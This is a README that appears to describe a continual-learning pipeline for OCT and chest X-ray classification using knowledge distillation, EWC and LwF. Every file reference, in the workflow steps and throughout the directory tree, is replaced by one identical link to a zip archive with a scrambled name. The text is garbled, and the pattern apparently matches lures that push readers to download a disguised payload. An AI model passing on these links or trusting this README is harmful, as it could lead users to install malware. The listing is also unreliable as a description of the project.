# Medical Imaging Continual Learning Pipeline

This project implements a **cross-domain continual learning pipeline** for medical imaging tasks using **knowledge distillation** and **continual learning algorithms**.  
A lightweight MobileNetV3 student model learns a new task (Chest X-ray classification) while retaining knowledge from a previous task (OCT retinal images).

---

## **Project Workflow**

### **Step 1: Train Teacher Model**
- `https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`  
- Fine-tune **ResNet-101** on OCT (Task A).  
- Freeze early convolutional layers, replace classifier with a custom head.  
- Output: Trained teacher checkpoint (`.pth`).

### **Step 2: Student Model Knowledge Distillation**
- Two pathways:
  1. **Feature-based KD** (`https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`)  
     - Align intermediate features of MobileNetV3 with the teacher.
  2. **Logit-based KD** (`https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`)  
     - Align student output logits with teacher logits (soft targets).  

### **Step 3: Continual Learning Adaptation**
- Adapt distilled student to **Task B (Chest X-ray)** using:

1. **EWC (Elastic Weight Consolidation)**  
   - `https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`  
   - Regularizes important Task A weights to reduce forgetting.

2. **LwF (Learning without Forgetting)**  
   - `https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip`  
   - Uses teacher predictions for Task A as soft targets during Task B training.  

### **Step 4: Optional BatchNorm Freezing**
- Freeze BatchNorm layers during Task B training to prevent distribution drift.  
- Significantly improves Task A retention (~99%) under both EWC and LwF.

---

## **Evaluation**
- **Metrics:** Accuracy, F1-score, retention percentage for Task A.  
- **Visualization:** Confusion matrices for Task A retention and Task B performance.  
- Compare:
  - Distillation paths: Feature KD vs Logit KD
  - Continual learning algorithms: EWC vs LwF
  - BatchNorm frozen vs not frozen

---

## **Directory Structure**
```
notebooks/
│
├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
│
├── feature_kd/
│   ├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
│   ├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
│   └── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
│
└── logit_kd/
    ├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
    ├── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
    └── https://raw.githubusercontent.com/zulqarnainsabir/Comparative-Analysis-of-Knowledge-Distillation-and-Continual-Learning-Strategies/main/notebooks/of-and-Strategies-Continual-Analysis-Distillation-Knowledge-Comparative-Learning-3.2.zip
```